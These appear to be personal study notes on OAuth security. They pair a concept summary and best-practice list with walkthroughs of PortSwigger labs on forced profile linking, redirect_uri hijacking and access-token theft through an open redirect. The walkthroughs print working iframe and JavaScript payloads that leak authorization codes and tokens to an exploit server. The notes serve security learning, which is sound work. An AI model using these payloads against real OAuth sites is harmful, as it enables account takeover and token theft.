- https://portswigger.net/web-security/oauth#what-is-oauth
- https://hacktricks.boitatech.com.br/pentesting-web/oauth-to-account-takeover

## Summary

### Key OAuth Concepts
1. **OAuth Roles**:
    - **Resource Owner**: The user who owns the data (typically the end-user)
    - **Client Application**: The website/app requesting access to user data
    - **OAuth Service Provider**: The platform holding the user's data
    - **Resource Server**: The server hosting the protected resources
2. **OAuth Flow Types**:
    - **Authorization Code Flow**: Most secure, designed for server-side applications
    - **Implicit Flow**: Simplified flow for client-side applications
    - **Resource Owner Password Credentials**: Direct credential sharing (rarely recommended)
    - **Client Credentials**: For server-to-server authentication
3. **OAuth Security Vulnerabilities**:
    - **Improper implementation of PKCE** (Proof Key for Code Exchange)
    - **Insufficient redirect_uri validation**
    - **Cross-site request forgery**
    - **Authorization code leaks**
    - **Token leakage through referrer headers**

### Common OAuth Exploits
1. **Redirect URI Manipulation**: Attackers can exploit loose validation of redirect URIs to steal authorization codes or tokens.
2. **Client Impersonation**: When client authentication is improperly implemented, attackers may impersonate legitimate clients.
3. **Access Token Theft**: Tokens can be leaked through client-side code, insecure storage, or compromised TLS.
4. **Scope Manipulation**: Attackers may attempt to escalate privileges by manipulating the scope parameter.

### OAuth Best Practices
1. **Implement PKCE** for all OAuth clients, even confidential ones
2. **Use strict redirect_uri validation** with exact matching
3. **Implement proper state parameter validation** to prevent CSRF
4. **Bind tokens to the intended recipient** using techniques like mTLS or DPoP
5. **Implement short expiration times** for access tokens
6. **Use refresh tokens** with rotation for improved security
7. **Validate all user input** related to OAuth flows



## 1. SSRF via OpenID dynamic client registration




## 2. Forced OAuth profile linking
This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete `carlos`.
The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:
- Blog website account: `wiener:peter`
- Social media profile: `peter.wiener:hotdog`

**Analysis:**
1. While proxying traffic through Burp, click "My account". You are taken to a normal login page, but notice that there is an option to log in using your social media profile instead. For now, just log in to the blog website directly using the classic login form.
2. *Notice that you have the option to attach your social media profile to your existing account*. Click "Attach a social profile". You are redirected to the social media website, where you should log in using your social media credentials to complete the OAuth flow. Afterwards, you will be redirected back to the blog website.
3. Log out and then click "My account" to go back to the login page. This time, choose the "Log in with social media" option. Observe that you are logged in instantly via your newly linked social media account.
4. In the proxy history, study the series of requests for attaching a social profile. In the `GET /auth?client_id[...]` request, observe that the `redirect_uri` for this functionality sends the authorization code to `/oauth-linking`. Importantly, notice that the request does not include a `state` parameter to protect against CSRF attacks. Turn on proxy interception and select the "Attach a social profile" option again.
5. Go to Burp Proxy and forward any requests until you have intercepted the one for `GET /oauth-linking?code=[...]`. Right-click on this request and select "Copy URL". Drop the request. This is important to ensure that the code is not used and, therefore, remains valid. Turn off proxy interception and log out of the blog website.
6. Go to the exploit server and create an `iframe` in which the `src` attribute points to the URL you just copied. The result should look something like this:
    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>`
7. Deliver the exploit to the victim. When their browser loads the `iframe`, it will complete the OAuth flow using your social media profile, attaching it to the admin account on the blog website. Go back to the blog website and select the "Log in with social media" option again. Observe that you are instantly logged in as the admin user. Go to the admin panel and delete `carlos` to solve the lab.

**Workflow**:
- no `state` param is implemented, that means that no protection against CSRF is in place
	![](Pasted%20image%2020241215221943.png)

- after linking a social media profile to our account, log out and connect trough social media again but this time intercept the request with proxy until the client code is received (drop the request afterwards in order to have a valid code - don t use it)
	![](Pasted%20image%2020241215222155.png)
- deliver the payload using the above URL containing our intercepted code--> when the victim(admin in our case) will open this iframe URL, our social media profile will be linked instead to his session (when will choose to log in with social media profile again we will observe that we forced a profile linking to an admin account)
	![](Pasted%20image%2020241215222841.png)


## 3. OAuth account hijacking via redirect_uri
This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user `carlos`. The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service. 

You can log in with your own social media account using the following credentials: `wiener:peter`.

**Analysis**:
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website. Log out and then log back in again. Observe that you are logged in instantly this time. As you still had an active session with the OAuth service, you didn't need to enter your credentials again to authenticate yourself.
2. In Burp, study the OAuth flow in the proxy history and identify the **most recent** authorization request. This should start with `GET /auth?client_id=[...]`. Notice that when this request is sent, you are immediately redirected to the `redirect_uri` along with the authorization code in the query string. Send this authorization request to Burp Repeater.
3. In Burp Repeater, observe that you can submit any arbitrary value as the `redirect_uri` without encountering an error. Notice that your input is used to generate the redirect in the response. Change the `redirect_uri` to point to the exploit server, then send the request and follow the redirect. Go to the exploit server's access log and observe that there is a log entry containing an authorization code. This confirms that you can leak authorization codes to an external domain.
4. Go back to the exploit server and create the following `iframe` at `/exploit`:
    `<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`
5. Store the exploit and click "View exploit". Check that your `iframe` loads and then check the exploit server's access log. If everything is working correctly, you should see another request with a leaked code. Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.
6. Log out of the blog website and then use the stolen code to navigate to:
    `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`


## 5. Stealing OAuth access tokens via an open redirect
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

***Note:***
You cannot access the admin's API key by simply logging in to their account on the client application. The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

**Analysis**:
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. Study the resulting requests and responses. Notice that the blog website makes an API call to the userinfo endpoint at `/me` and then uses the data it fetches to log the user in. Send the `GET /me` request to Burp Repeater.
3. Log out of your account and log back in again. From the proxy history, find the most recent `GET /auth?client_id=[...]` request and send it to Repeater. In Repeater, experiment with the `GET /auth?client_id=[...]` request. Observe that you cannot supply an external domain as `redirect_uri` because it's being validated against a whitelist. However, you can append additional characters to the default value without encountering an error, including the `/../` path traversal sequence.
4. Log out of your account on the blog website and turn on proxy interception in Burp. In the browser, log in again and go to the intercepted `GET /auth?client_id=[...]` request in Burp Proxy.
5. Confirm that the `redirect_uri` parameter is in fact vulnerable to directory traversal by changing it to:
    `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1`
    Forward any remaining requests and observe that you are eventually redirected to the first blog post. In the browser, notice that your access token is included in the URL as a fragment.
6. With the help of Burp, audit the other pages on the blog website. Identify the "Next post" option at the bottom of each blog post, which works by redirecting users to the path specified in a query parameter. Send the corresponding `GET /post/next?path=[...]` request to Repeater.
7. In Repeater, experiment with the `path` parameter. Notice that this is an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server.
8. Craft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the `redirect_uri` pointing to the open redirect, which subsequently forwards the victim to your exploit server:
    `https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`
9. Test that this URL works correctly by visiting it in the browser. You should be redirected to the exploit server's "Hello, world!" page, along with the access token in a URL fragment.
10. On the exploit server, create a suitable script at `/exploit` that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:
    `<script> window.location = '/?'+document.location.hash.substr(1) </script>`
11. To test that everything is working correctly, store this exploit and visit your malicious URL again in the browser. Then, go to the exploit server access log. There should be a request for `GET /?access_token=[...]`.
12. You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example:
    `<script> if (!document.location.hash) { window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' } else { window.location = '/?'+document.location.hash.substr(1) } </script>`
13. To test that the exploit works, store it and then click "View exploit". The page should appear to refresh, but if you check the access log, you should see a new request for `GET /?access_token=[...]`. Deliver the exploit to the victim, then copy their access token from the log.
14. In Repeater, go to the `GET /me` request and replace the token in the `Authorization: Bearer` header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.


**Workflow**:
- initial API get request
  ![](Pasted%20image%2020241216122752.png)
  - initial oauth flow
	![](Pasted%20image%2020241216122828.png)
- testing for redirect (adding /../)
	![](Pasted%20image%2020241216122850.png)

- finding a valid redirect page (next post feature of the blog posts)
	![](Pasted%20image%2020241216122941.png)

- chaining all exploits together (redirect_uri --> our exploit server)
	![](Pasted%20image%2020241216121556.png)

- testing the redirect to the exploit server
	![](Pasted%20image%2020241216121351.png)

- adding payload script for token extraction
	![](Pasted%20image%2020241216121332.png)

- testing the method
	![](Pasted%20image%2020241216121506.png)

- building the final exploit (more details to add)
	![](Pasted%20image%2020241216121933.png)

- testing the final exploit form
	![](Pasted%20image%2020241216122038.png)

- delivering exploit to the victim and capture his token
	![](Pasted%20image%2020241216122226.png)

- back to the API request --> inject the extracted token 
	![](Pasted%20image%2020241216122633.png)
	
**Script**:
If the hash is not present:
- The browser is redirected (`window.location`) to an OAuth authentication endpoint. This URL includes various parameters that are critical for the OAuth flow:
    - `client_id=YOUR-LAB-CLIENT-ID`: Identifies the client requesting authentication.
    - `redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/`: Specifies where the OAuth server should redirect the user after authentication. Here, it is set to a URL containing an additional path manipulation (likely for exploit purposes).

If the hash is present:
- The code redirects the browser to a new URL that appends the hash fragment (excluding the `#`) as a query string parameter.
- `document.location.hash.substr(1)`:
    - `.hash.substr(1)` removes the leading `#` from the hash value.
    - For example, if the hash is `#access_token=abc123`, this will result in `access_token=abc123`.
- The resulting redirection might look like `/?access_token=abc123`.

**Purpose**
- **Without a hash**: Redirects the user to an OAuth authentication server to obtain an access token.
- **With a hash**: Appends the hash data to the new URL as a query parameter likely to process the token 


## 4. Stealing OAuth access tokens via a proxy page



